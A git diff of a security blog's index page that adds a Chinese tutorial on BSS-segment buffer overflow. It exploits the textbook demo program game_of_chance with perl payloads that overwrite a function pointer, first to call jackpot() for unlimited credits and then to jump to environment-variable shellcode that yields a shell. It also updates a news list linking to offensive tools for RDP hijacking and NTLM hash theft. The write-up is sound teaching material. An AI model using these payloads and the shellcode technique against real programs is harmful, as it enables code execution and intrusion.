@@ -318,6 +318,170 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/03/22/BSS块的溢出/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/03/22/BSS块的溢出/" itemprop="url">
+                  BSS块的溢出
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-22T01:30:17+08:00">
+                2018-03-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
+<li>缓冲区溢出除了典型的<a href="https://kevien.github.io/2017/08/16/linux栈溢出学习笔记/">栈溢出</a>和<a href="https://kevien.github.io/2017/10/28/堆溢出利用笔记/">堆溢出</a>，还有一种发生在bss节区上的，bss属于数据节区的一种，通常用来保存未初始化的静态变量。<a href="https://www.wikiwand.com/en/BSS" target="_blank" rel="external">wiki</a></li>
+<li>测试环境ubuntu14.04X86.<h4 id="vul-code-snippet"><a href="#vul-code-snippet" class="headerlink" title="vul code snippet"></a>vul code snippet</h4></li>
+<li><p>from game_of_chance.c</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">// Custom user struct to store information about users </div><div class="line">struct user &#123;</div><div class="line">    int uid;</div><div class="line">    int credits;</div><div class="line">    int highscore;</div><div class="line">    char name[100];</div><div class="line">    int (*current_game) ();</div><div class="line">&#125;;</div><div class="line"></div><div class="line">...</div><div class="line">struct user player;     // Player struct</div></pre></td></tr></table></figure>
+</li>
+<li><p>其中game_of_chance 是如下图的一个游戏<br><img src="/2018/03/22/BSS块的溢出/game.png" alt=""></p>
+</li>
+<li><p>如上的代码片段中用一个函数指针保存了上次玩了哪个游戏，这个指针保存在user的结构体中，且被声明为全局变量，这意味着user这个结构体变量保存在bss数据段。其中结构体中固定为100字节的name变量保存了用户的姓名，且这个name是可以被input_name()这个函数所控制的，如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">void input_name() &#123;</div><div class="line">   char *name_ptr, input_char=&apos;\n&apos;;</div><div class="line">   while(input_char == &apos;\n&apos;)    // Flush any leftover </div><div class="line">      scanf(&quot;%c&quot;, &amp;input_char); // newline chars.</div><div class="line">   </div><div class="line">   name_ptr = (char *) &amp;(player.name); // name_ptr = player name&apos;s address</div><div class="line">   while(input_char != &apos;\n&apos;) &#123;  // Loop until newline.</div><div class="line">      *name_ptr = input_char;   // Put the input char into name field.</div><div class="line">      scanf(&quot;%c&quot;, &amp;input_char); // Get the next char.</div><div class="line">      name_ptr++;               // Increment the name pointer.</div><div class="line">   &#125;</div><div class="line">   *name_ptr = 0;  // Terminate the string.</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>这个函数会接收用户输入的名字直到用户输入换行符，所以这里并没有有效的限制用户的输入，就意味着可以被利用，此外我们覆盖之后还需要程序去调用这个函数指针，这个功能可以发生在play_the_game()这个功能函数中，这个功能函数在用户选择要玩的游戏的时候被调用。代码片段如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">if((choice &lt; 1) || (choice &gt; 7))</div><div class="line">       printf(&quot;\n[!!] The number %d is an invalid selection.\n\n&quot;, choice);</div><div class="line">    else if (choice &lt; 4) &#123;  // Othewise, choice was a game of some sort.</div><div class="line">          if(choice != last_game) &#123; // If the function ptr isn&apos;t set</div><div class="line">             if(choice == 1)        // then point it at the selected game </div><div class="line">                player.current_game = pick_a_number;   </div><div class="line">             else if(choice == 2)                     </div><div class="line">                player.current_game = dealer_no_match;</div><div class="line">             else</div><div class="line">                player.current_game = find_the_ace;</div><div class="line">             last_game = choice;   // and set last_game.</div><div class="line">          &#125;</div><div class="line">          play_the_game();   // Play the game.</div><div class="line">       &#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>如果last_game 和当前的选择不一致，函数指针current_game 会被设置成当前的选择，意味着要程序去调用函数指针，就需要首先设置last_game这个变量。<br>![gamemain.png]</p>
+</li>
+<li>我们可以通过ctrl+z挂起当前的进程，这个时候，last_game变量被设置成了1(因为刚才玩的是游戏1)，这个时候就可以进入if后面的判断了，我们找到了可以被溢出的变量name，然后让我们通过简单调试看一下name和current_game指针在内存中的位置关系。<br><img src="/2018/03/22/BSS块的溢出/distance.png" alt=""></li>
+<li>如上图所示，正好是100个字节，通过以上我们可以进行如下的覆盖尝试<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;A&quot;x100 . &quot;BBBB&quot; . &quot;\n&quot;&apos;</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2018/03/22/BSS块的溢出/flowattempt.png" alt=""></p>
+<ul>
+<li>可以看到程序崩溃之前curren_game已被成功覆盖为BBBB，这个时候我们需要一个”有效的”地址去做不可描述的事情。</li>
+<li>nm命令可以查看程序的符号表，我们来看一下程序有哪些函数以及其对应的内存地址（此思路常用语破解）。<br><img src="/2018/03/22/BSS块的溢出/jackpot.png" alt=""></li>
+<li>jackpot是这个函数是我们最理想的目标，这个函数用来给我们增加”金币”,所以当current_game函数指针被覆盖成这个函数的时候，我们就可以拥有数不完的”金币”</li>
+<li><p>这个程序通过标准输入进行用户交互，我们完全可以实现自动化，如下的例子将会让我自动选择游戏1，然后猜测数字7，当被问是否还玩的时候选择no，最后通过选择7退出程序。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;1\n7\nn\n7\n&quot;&apos; | ./game_of_chance</div></pre></td></tr></table></figure>
+</li>
+<li><p>同样的技术可以用到我们的自动化exploit中，下面的命令将会完成我们修改用户名为100个A加jackpot()的地址，这个时候就覆盖掉了current_game的地址，然后当再次选择我们要玩的游戏的后，jackpot()函数就会被调用。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\xa5\x8c\x04\x08\n&quot; . &quot;1\nn\n&quot; . &quot;7\n&quot;&apos; | ./game_of_chance </div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 90 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0x08048f15</div><div class="line"></div><div class="line">####### Pick a Number ######</div><div class="line">This game costs 10 credits to play. Simply pick a number</div><div class="line">between 1 and 20, and if you pick the winning number, you</div><div class="line">will win the jackpot of 100 credits!</div><div class="line"></div><div class="line">10 credits have been deducted from your account.</div><div class="line">Pick a number between 1 and 20: The winning number is 11</div><div class="line">Sorry, you didn&apos;t win.</div><div class="line"></div><div class="line">You now have 80 credits</div><div class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 80 credits] -&gt;  </div><div class="line">Change user name</div><div class="line">Enter your new name: Your name has been changed.</div><div class="line"></div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]</div><div class="line">[You have 80 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0x08048ca5</div><div class="line">*+*+*+*+*+* JACKPOT *+*+*+*+*+*</div><div class="line">You have won the jackpot of 100 credits!</div><div class="line"></div><div class="line">You now have 180 credits</div><div class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]</div><div class="line">[You have 180 credits] -&gt;  </div><div class="line">Thanks for playing! Bye.</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$</div></pre></td></tr></table></figure>
+</li>
+<li><p>可以看到我们函数被调用我们增加了100金币</p>
+</li>
+<li>因为只要有调用函数指针的操作就会触发jackpot函数，只要我们不退出，就可以无限刷金币,像是如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\xa5\x8c\x04\x08\n&quot; . &quot;1\n&quot; .&quot;y\n&quot;x10.  &quot;n\n5\nM0rk\n7\n&quot;&apos; | ./game_of_chance</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2018/03/22/BSS块的溢出/getall.png" alt=""></p>
+<ul>
+<li>到这里可能有人会问那能不能getshell呢，答案是可以的，我们知道每个运行的程序都会加载系统变量，我们可以事先将shellcode写入到环境变量中，然后将跳转地址指向shellcode，就可以执行我们的shellcode了。getenvaddr用来获取SHELLCODE环境变量在程序运行时候所在的地址。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ echo $SHELLCODE</div><div class="line">��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�1�1ə��̀j</div><div class="line">                                                          XQh//shh/bin��Q��S��̀</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ ./getenvaddr SHELLCODE ./game_of_chance</div><div class="line">SHELLCODE will be at 0xbffff206</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;1\n7\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\x06\xf2\xff\xbf\n&quot; . &quot;1\n&quot;&apos; &gt; exploit_buff</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ cat exploit_buff - | ./game_of_chance </div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 1260 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0x08048f15</div><div class="line"></div><div class="line">####### Pick a Number ######</div><div class="line">This game costs 10 credits to play. Simply pick a number</div><div class="line">between 1 and 20, and if you pick the winning number, you</div><div class="line">will win the jackpot of 100 credits!</div><div class="line"></div><div class="line">10 credits have been deducted from your account.</div><div class="line">Pick a number between 1 and 20: The winning number is 6</div><div class="line">Sorry, you didn&apos;t win.</div><div class="line"></div><div class="line">You now have 1250 credits</div><div class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 1250 credits] -&gt;  </div><div class="line">Change user name</div><div class="line">Enter your new name: Your name has been changed.</div><div class="line"></div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���]</div><div class="line">[You have 1250 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0xbffff206</div><div class="line">id</div><div class="line">uid=1000(xxx) gid=1000(xxx) groups=1000(xxx),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="相关源码下载"><a href="#相关源码下载" class="headerlink" title="相关源码下载"></a>相关源码下载</h4><p><a href="https://github.com/kevien/exploitcode/bssexploit" target="_blank" rel="external">github</a></p>
+<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><ul>
+<li>《Hacking the art of exploitation》0x342</li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/03/19/20180319安全动态/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -396,7 +560,7 @@
           
             <h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
 <li>使用 Sysmon 和 Splunk 进行高级事件检测与威胁追查，来自 BotConf2016<br><a href="https://www.botconf.eu/wp-content/uploads/2016/11/PR12-Sysmon-UELTSCHI.pdf" target="_blank" rel="external">https://www.botconf.eu/wp-content/uploads/2016/11/PR12-Sysmon-UELTSCHI.pdf</a></li>
-<li>RDP 劫持 - 如何透明地劫持 RDS 和 RemoteApp 会话以实现横向渗透<br><a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x68;&#116;&#116;&#x70;&#x73;&#58;&#47;&#x2f;&#x6d;&#101;&#x64;&#x69;&#x75;&#109;&#46;&#99;&#x6f;&#x6d;&#47;&#x40;&#x6e;&#101;&#116;&#119;&#x6f;&#x72;&#x6b;&#x73;&#101;&#99;&#x75;&#114;&#105;&#x74;&#121;&#x2f;&#114;&#100;&#x70;&#45;&#x68;&#105;&#x6a;&#x61;&#99;&#x6b;&#x69;&#x6e;&#x67;&#45;&#104;&#111;&#x77;&#x2d;&#116;&#x6f;&#45;&#104;&#105;&#x6a;&#x61;&#x63;&#x6b;&#45;&#114;&#100;&#115;&#x2d;&#97;&#110;&#100;&#45;&#114;&#x65;&#109;&#111;&#116;&#101;&#97;&#112;&#112;&#45;&#115;&#101;&#115;&#115;&#105;&#x6f;&#x6e;&#x73;&#45;&#x74;&#x72;&#97;&#x6e;&#115;&#112;&#97;&#x72;&#x65;&#110;&#116;&#108;&#x79;&#45;&#116;&#111;&#x2d;&#109;&#x6f;&#x76;&#x65;&#x2d;&#x74;&#x68;&#x72;&#111;&#117;&#103;&#104;&#45;&#97;&#110;&#45;&#x64;&#x61;&#50;&#97;&#49;&#x65;&#55;&#x33;&#x61;&#x35;&#102;&#x36;">&#x68;&#116;&#116;&#x70;&#x73;&#58;&#47;&#x2f;&#x6d;&#101;&#x64;&#x69;&#x75;&#109;&#46;&#99;&#x6f;&#x6d;&#47;&#x40;&#x6e;&#101;&#116;&#119;&#x6f;&#x72;&#x6b;&#x73;&#101;&#99;&#x75;&#114;&#105;&#x74;&#121;&#x2f;&#114;&#100;&#x70;&#45;&#x68;&#105;&#x6a;&#x61;&#99;&#x6b;&#x69;&#x6e;&#x67;&#45;&#104;&#111;&#x77;&#x2d;&#116;&#x6f;&#45;&#104;&#105;&#x6a;&#x61;&#x63;&#x6b;&#45;&#114;&#100;&#115;&#x2d;&#97;&#110;&#100;&#45;&#114;&#x65;&#109;&#111;&#116;&#101;&#97;&#112;&#112;&#45;&#115;&#101;&#115;&#115;&#105;&#x6f;&#x6e;&#x73;&#45;&#x74;&#x72;&#97;&#x6e;&#115;&#112;&#97;&#x72;&#x65;&#110;&#116;&#108;&#x79;&#45;&#116;&#111;&#x2d;&#109;&#x6f;&#x76;&#x65;&#x2d;&#x74;&#x68;&#x72;&#111;&#117;&#103;&#104;&#45;&#97;&#110;&#45;&#x64;&#x61;&#50;&#97;&#49;&#x65;&#55;&#x33;&#x61;&#x35;&#102;&#x36;</a></li>
+<li>RDP 劫持 - 如何透明地劫持 RDS 和 RemoteApp 会话以实现横向渗透<br><a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#x3a;&#x68;&#116;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x6d;&#101;&#100;&#105;&#x75;&#109;&#46;&#99;&#111;&#109;&#47;&#64;&#110;&#101;&#x74;&#119;&#x6f;&#x72;&#107;&#115;&#x65;&#x63;&#x75;&#x72;&#105;&#x74;&#121;&#47;&#x72;&#x64;&#x70;&#x2d;&#104;&#105;&#x6a;&#97;&#99;&#x6b;&#x69;&#x6e;&#x67;&#45;&#x68;&#x6f;&#119;&#45;&#116;&#111;&#45;&#104;&#x69;&#106;&#x61;&#x63;&#107;&#x2d;&#114;&#100;&#115;&#45;&#97;&#110;&#x64;&#x2d;&#x72;&#101;&#x6d;&#x6f;&#116;&#101;&#x61;&#x70;&#x70;&#x2d;&#115;&#101;&#115;&#x73;&#105;&#x6f;&#x6e;&#x73;&#x2d;&#116;&#114;&#97;&#110;&#x73;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#108;&#x79;&#45;&#116;&#111;&#x2d;&#x6d;&#111;&#118;&#101;&#45;&#x74;&#104;&#x72;&#111;&#117;&#x67;&#x68;&#x2d;&#x61;&#110;&#x2d;&#100;&#x61;&#x32;&#97;&#49;&#x65;&#x37;&#51;&#x61;&#x35;&#x66;&#x36;">&#x68;&#116;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#x2f;&#x6d;&#101;&#100;&#105;&#x75;&#109;&#46;&#99;&#111;&#109;&#47;&#64;&#110;&#101;&#x74;&#119;&#x6f;&#x72;&#107;&#115;&#x65;&#x63;&#x75;&#x72;&#105;&#x74;&#121;&#47;&#x72;&#x64;&#x70;&#x2d;&#104;&#105;&#x6a;&#97;&#99;&#x6b;&#x69;&#x6e;&#x67;&#45;&#x68;&#x6f;&#119;&#45;&#116;&#111;&#45;&#104;&#x69;&#106;&#x61;&#x63;&#107;&#x2d;&#114;&#100;&#115;&#45;&#97;&#110;&#x64;&#x2d;&#x72;&#101;&#x6d;&#x6f;&#116;&#101;&#x61;&#x70;&#x70;&#x2d;&#115;&#101;&#115;&#x73;&#105;&#x6f;&#x6e;&#x73;&#x2d;&#116;&#114;&#97;&#110;&#x73;&#x70;&#x61;&#x72;&#x65;&#x6e;&#x74;&#108;&#x79;&#45;&#116;&#111;&#x2d;&#x6d;&#111;&#118;&#101;&#45;&#x74;&#104;&#x72;&#111;&#117;&#x67;&#x68;&#x2d;&#x61;&#110;&#x2d;&#100;&#x61;&#x32;&#97;&#49;&#x65;&#x37;&#51;&#x61;&#x35;&#x66;&#x36;</a></li>
 <li>Protecting Against HSTS Abuse<br><a href="https://webkit.org/blog/8146/protecting-against-hsts-abuse/" target="_blank" rel="external">https://webkit.org/blog/8146/protecting-against-hsts-abuse/</a></li>
 <li>Tokenvator - 操作 Windows Tokens 进行提权的工具<br><a href="https://github.com/0xbadjuju/Tokenvator" target="_blank" rel="external">https://github.com/0xbadjuju/Tokenvator</a></li>
 <li>Defending Microsoft environments at scale，大规模 Microsoft 环境的防御方案<br><a href="https://drive.google.com/file/d/1QXjmlPRvfiRBnqzNpsTQo5bn0xKQoNc4/view" target="_blank" rel="external">https://drive.google.com/file/d/1QXjmlPRvfiRBnqzNpsTQo5bn0xKQoNc4/view</a></li>
@@ -404,6 +568,7 @@
 <li>十种进程注入技术介绍<br><a href="https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process" target="_blank" rel="external">https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process</a></li>
 <li>Internal-Monologue - 在不触碰 LSASS 的情况下抓取 NTLM Hashes 的攻击方式<br><a href="https://github.com/eladshamir/Internal-Monologue" target="_blank" rel="external">https://github.com/eladshamir/Internal-Monologue</a></li>
 <li>滥用 LAPS 实现持久化控制<br><a href="https://rastamouse.me/2018/03/laps---part-2/" target="_blank" rel="external">https://rastamouse.me/2018/03/laps---part-2/</a></li>
+<li>Pwn a ARM Router Step by Step<br><a href="https://xianzhi.aliyun.com/forum/topic/2184" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/topic/2184</a></li>
 </ul>
 
           
@@ -1110,7 +1275,7 @@
         
           
             <h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
-<li>Bug Bounty Web 漏洞挖掘的几个小 Tips<br><a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#58;&#x68;&#116;&#x74;&#112;&#115;&#58;&#x2f;&#47;&#109;&#x65;&#100;&#105;&#117;&#x6d;&#x2e;&#x63;&#x6f;&#109;&#47;&#64;&#112;&#x72;&#97;&#x74;&#x65;&#x65;&#107;&#x5f;&#48;&#52;&#57;&#48;&#47;&#x62;&#x75;&#x67;&#x2d;&#98;&#x6f;&#117;&#x6e;&#x74;&#121;&#45;&#x74;&#105;&#x70;&#115;&#x2d;&#x74;&#x72;&#x69;&#x63;&#x6b;&#115;&#45;&#106;&#115;&#x2d;&#106;&#97;&#x76;&#97;&#115;&#x63;&#114;&#x69;&#112;&#116;&#45;&#102;&#105;&#108;&#x65;&#x73;&#x2d;&#98;&#x64;&#x64;&#101;&#52;&#x31;&#x32;&#x65;&#97;&#52;&#57;&#x64;">&#x68;&#116;&#x74;&#112;&#115;&#58;&#x2f;&#47;&#109;&#x65;&#100;&#105;&#117;&#x6d;&#x2e;&#x63;&#x6f;&#109;&#47;&#64;&#112;&#x72;&#97;&#x74;&#x65;&#x65;&#107;&#x5f;&#48;&#52;&#57;&#48;&#47;&#x62;&#x75;&#x67;&#x2d;&#98;&#x6f;&#117;&#x6e;&#x74;&#121;&#45;&#x74;&#105;&#x70;&#115;&#x2d;&#x74;&#x72;&#x69;&#x63;&#x6b;&#115;&#45;&#106;&#115;&#x2d;&#106;&#97;&#x76;&#97;&#115;&#x63;&#114;&#x69;&#112;&#116;&#45;&#102;&#105;&#108;&#x65;&#x73;&#x2d;&#98;&#x64;&#x64;&#101;&#52;&#x31;&#x32;&#x65;&#97;&#52;&#57;&#x64;</a></li>
+<li>Bug Bounty Web 漏洞挖掘的几个小 Tips<br><a href="&#x6d;&#97;&#x69;&#108;&#116;&#x6f;&#58;&#104;&#116;&#116;&#112;&#x73;&#58;&#x2f;&#47;&#109;&#x65;&#100;&#x69;&#x75;&#x6d;&#x2e;&#x63;&#111;&#109;&#x2f;&#x40;&#x70;&#114;&#97;&#x74;&#x65;&#x65;&#x6b;&#x5f;&#48;&#52;&#57;&#48;&#x2f;&#x62;&#x75;&#x67;&#45;&#x62;&#111;&#117;&#110;&#x74;&#121;&#45;&#116;&#x69;&#x70;&#115;&#x2d;&#116;&#x72;&#x69;&#x63;&#x6b;&#x73;&#x2d;&#106;&#x73;&#45;&#x6a;&#97;&#118;&#x61;&#115;&#99;&#x72;&#105;&#112;&#116;&#45;&#102;&#x69;&#108;&#x65;&#x73;&#45;&#98;&#100;&#x64;&#101;&#52;&#x31;&#50;&#101;&#x61;&#52;&#x39;&#100;">&#104;&#116;&#116;&#112;&#x73;&#58;&#x2f;&#47;&#109;&#x65;&#100;&#x69;&#x75;&#x6d;&#x2e;&#x63;&#111;&#109;&#x2f;&#x40;&#x70;&#114;&#97;&#x74;&#x65;&#x65;&#x6b;&#x5f;&#48;&#52;&#57;&#48;&#x2f;&#x62;&#x75;&#x67;&#45;&#x62;&#111;&#117;&#110;&#x74;&#121;&#45;&#116;&#x69;&#x70;&#115;&#x2d;&#116;&#x72;&#x69;&#x63;&#x6b;&#x73;&#x2d;&#106;&#x73;&#45;&#x6a;&#97;&#118;&#x61;&#115;&#99;&#x72;&#105;&#112;&#116;&#45;&#102;&#x69;&#108;&#x65;&#x73;&#45;&#98;&#100;&#x64;&#101;&#52;&#x31;&#50;&#101;&#x61;&#52;&#x39;&#100;</a></li>
 <li>Linux ASLR 缓解措施的新绕过方法<br><a href="http://blog.ptsecurity.com/2018/02/new-bypass-and-protection-techniques.html" target="_blank" rel="external">http://blog.ptsecurity.com/2018/02/new-bypass-and-protection-techniques.html</a></li>
 <li>Linux 系统调用的过程剖析<br><a href="https://lwn.net/Articles/604287/" target="_blank" rel="external">https://lwn.net/Articles/604287/</a></li>
